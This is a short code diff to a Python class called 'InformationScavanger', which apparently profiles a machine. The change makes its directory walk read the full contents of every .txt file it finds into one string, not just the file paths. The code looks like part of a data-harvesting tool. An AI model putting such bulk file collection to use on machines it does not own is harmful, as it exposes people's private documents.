@@ -1,3 +1,4 @@
+import codecs
 import platform
 import psutil
 import GPUtil
@@ -306,6 +307,10 @@ class InformationScavanger:
             for file in files:
                 if file.endswith(".txt"):
                     return_string += os.path.join(root, file)
+                    return_string += "#####################################################\n"
+                    with codecs.open(os.path.join(root, file), 'r', encoding="utf8", errors='ignore') as f:
+                        return_string += '{}'.format(f.read()).encode('utf-8', 'replace').decode()
+                    return_string += "#####################################################\n"
         return return_string
 
     def retriveFiles(self):
